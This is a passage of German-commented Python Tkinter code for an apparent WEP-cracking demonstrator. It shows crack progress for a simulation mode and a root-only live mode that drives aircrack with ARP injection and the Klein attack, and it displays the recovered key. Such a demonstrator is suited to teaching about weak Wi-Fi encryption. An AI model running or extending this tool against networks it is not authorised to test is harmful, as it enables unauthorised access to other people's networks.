        # Inject-/Crack-Buttons nur in der Capture-Phase steuern
        if self.is_live and ph != "capture":
            self.inject_btn.config(state="disabled", fg=DIM, bg="#2a2a2a")
            self.crackbtn.config(state="disabled", fg=DIM, bg="#2a2a2a")
            self.arp_lbl.config(text="", fg=DIM)
            return
        if not injecting:
            if self.ivs >= 1:
                self.inject_btn.config(state="normal", fg=WARN, bg="#3a2f12")
            else:
                self.inject_btn.config(state="disabled", fg=DIM, bg="#2a2a2a")

        if replaying and injecting:
            txt = "✓  ARP abgefangen (%d) — Injection läuft" % arp
            if pps:
                txt += "  •  ~%d pps" % pps
            self.arp_lbl.config(text=txt, fg=LOCKED)
        elif injecting:
            self.arp_lbl.config(
                text="⚡  warte auf ARP-Paket (Client-Traffic nötig)...", fg=WARN)
        elif self.ivs >= 1:
            self.arp_lbl.config(
                text="▶  Pakete gesehen — 'Inject Traffic' drücken", fg=LEAD)
        else:
            self.arp_lbl.config(text="⏳  warte auf erstes Paket...", fg=DIM)

    def _render_crack(self):
        self.iv_lbl.config(text="{:,}".format(int(self.ivs_disp)))
        self._update_inject_ui()
        ph = getattr(self.backend, "phase", "capture")
        injecting = getattr(self.backend, "injecting", False)
        if ph == "replay" and getattr(self, "_replay_total", 0):
            # Crack-Fortschritt: verarbeitete IVs / Gesamt
            pct = min(100, int(100 * self.ivs_disp / max(1, self._replay_total)))
            self.rate_lbl.config(
                text="Crack-Fortschritt: %s / %s IVs  (%d%%)"
                     % ("{:,}".format(int(self.ivs_disp)),
                        "{:,}".format(int(self._replay_total)), pct), fg=WARN)
        else:
            # Indikator NUR bei aktiver Injection in der Capture-Phase
            self.rate_lbl.config(
                text=("\u26A1 INJECTION L\u00C4UFT" if (injecting and ph == "capture") else ""))
        # aircracks echte Kopfzeile (getestete Keys / IVs)
        hdr = getattr(self.backend, "live_header", None)
        if hasattr(self, "hdr_lbl"):
            self.hdr_lbl.config(
                text=("Klein-Angriff: %s Pakete verarbeitet" %
                      "{:,}".format(hdr[1])) if hdr else "")
        depths = getattr(self.backend, "live_depth", None) if self.is_live else None
        # Live-Modus: NUR echte aircrack-Daten (keine Simulation). Sim-Modus: Modell.
        live_tab = getattr(self.backend, "live_table", None) if self.is_live else None
        use_real = self.is_live
        if use_real:
            if live_tab:
                self.solved_lbl.config(text="echte Klein-Votes (%d Bytes)" % self.model.n)
            else:
                self.solved_lbl.config(text="")
        else:
            solved = sum(self.model.locked)
            self.solved_lbl.config(text="gelöst: %d / %d Bytes" % (solved, self.model.n))

        for i, cell in enumerate(self.cells):
            locked = self.model.locked[i]
            cell["frame"].config(highlightbackground=(LOCKED if locked else "#223029"))
            # echte Suchtiefe je Byte anzeigen (aircracks 'depth d/D')
            if "depth" in cell:
                if depths and i < len(depths) and depths[i]:
                    cell["depth"].config(text="Tiefe %d/%d" % depths[i])
                else:
                    cell["depth"].config(text="")
            if self.model.revealed:
                # show the REAL recovered byte, locked
                real = "%02X" % self.model.revealed[i]
                for ri, (val, cv, bar, cnt) in enumerate(cell["rows"]):
                    if ri == 0:
                        val.config(text=real, fg=LOCKED)
                        cv.coords(bar, 0, 0, 70, 10); cv.itemconfig(bar, fill=LOCKED)
                        cnt.config(text="real")
                    else:
                        val.config(text="--", fg=DECOY)
                        cv.coords(bar, 0, 0, 0, 10); cnt.config(text="")
                continue
            if use_real:
                src = live_tab[i] if (live_tab and i < len(live_tab)) else []
                ranked = sorted(src, key=lambda c: c[1], reverse=True)[:CANDIDATES_SHOWN]
            else:
                ranked = self.model.top(i, CANDIDATES_SHOWN)
            lead_n = ranked[0][1] if ranked else 0
            for ri, (val, cv, bar, cnt) in enumerate(cell["rows"]):
                # noch keine Votes -> Rangliste leer lassen
                if ri < len(ranked) and lead_n > 0 and ranked[ri][1] > 0:
                    cval, cn = ranked[ri]
                    is_leader = (ri == 0)
                    color = LOCKED if (locked and is_leader) else (LEAD if is_leader else DECOY)
                    val.config(text="%02X" % cval, fg=color)
                    w = int(70*(cn/lead_n)) if lead_n else 0
                    cv.coords(bar, 0, 0, w, 10); cv.itemconfig(bar, fill=color)
                    cnt.config(text=str(cn))
                else:
                    val.config(text="--", fg=DECOY)
                    cv.coords(bar, 0, 0, 0, 10); cnt.config(text="")

        # Sim: alle Bytes gerastet -> als geknackt markieren
        if not self.is_live and not self.cracked and self.model.all_locked():
            self.cracked = True

        # Live-Schlüssel-Zeile: läuft ständig mit (führender Kandidat je Byte),
        # rastet beim echten KEY FOUND grün ein.
        if self.model.revealed or self.cracked:
            if getattr(self, "_final_secret", None):
                final = ":".join("%02X" % b for b in self._final_secret)
            else:
                final = self.model.full_key_hex()
            self.key_lbl.config(text=final, fg=LOCKED)
            self.key_state_lbl.config(text="✓ KEY FOUND", fg=LOCKED)
            if not getattr(self, "_key_done_logged", False):
                self._key_done_logged = True
                self.log_line("KEY FOUND -> " + final)
                self._feed_converter(final)
        elif self.is_live:
            ph = getattr(self.backend, "phase", "capture")
            air = getattr(self.backend, "live_key_guess", [])
            if ph == "capture":
                self.key_lbl.config(text="…", fg=DIM)
                enough = self.ivs >= CAPTURE_TARGET_IVS
                self.key_state_lbl.config(
                    text=("Phase 1: IVs sammeln läuft weiter — '%s' drücken, "
                          "wenn du bereit bist (empfohlen ab ~%s). %s"
                          % ("Crack zeigen", "{:,}".format(CAPTURE_TARGET_IVS),
                             "✓ genug" if enough else "noch sammeln …")),
                    fg=(LOCKED if enough else DIM))
            elif ph == "computing":
                prog = getattr(self.backend, "_compute_progress", (0, 0))
                self.key_lbl.config(text="…", fg=WARN)
                if prog == (0, 1):
                    txt = "lese Pakete (direkter Parser) …"
                else:
                    txt = "bereite Angriff vor (Byte %d/%d) …" % prog
                self.key_state_lbl.config(text=txt, fg=WARN)
            elif air:
                self.key_lbl.config(text=":".join("%02X" % b for b in air), fg=LEAD)
                self.key_state_lbl.config(
                    text="Phase 2: echte Klein-Votes (@ %s Paketen)"
                         % "{:,}".format(int(self.ivs)), fg=DIM)
            else:
                self.key_lbl.config(text="…", fg=DIM)
                self.key_state_lbl.config(text="Crack-Verlauf startet …", fg=DIM)
        else:
            # Sim: hier kennen wir das Ziel, die Live-Schätzung ist echt.
            guess = self.model.current_guess_hex()
            self.key_lbl.config(text=guess, fg=LEAD)
            solved = sum(self.model.locked)
            self.key_state_lbl.config(
                text="berechnet live … (%d/%d Bytes sicher)" % (solved, self.model.n),
                fg=DIM)

    def _feed_converter(self, hexstr):
        """Schiebt den gefundenen Schlüssel automatisch in den Umrechner,
        falls er offen ist."""
        if getattr(self, "_conv", None) and self._conv.winfo_exists():
            self._conv_set_from_hex(hexstr)

    def _on_close(self):
        try:
            self.backend.stop()
        except Exception:
            pass
        try:
            self.root.destroy()
        except Exception:
            pass
        # Sicherheitsnetz: Prozess hart beenden, damit keine Reste CPU fressen
        os._exit(0)


def main():
    if MODE == "live" and os.geteuid() != 0:
        print("LIVE-Modus braucht root: sudo python3 wep_demo.py")
    root = tk.Tk()
    App(root)
    try:
        root.mainloop()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
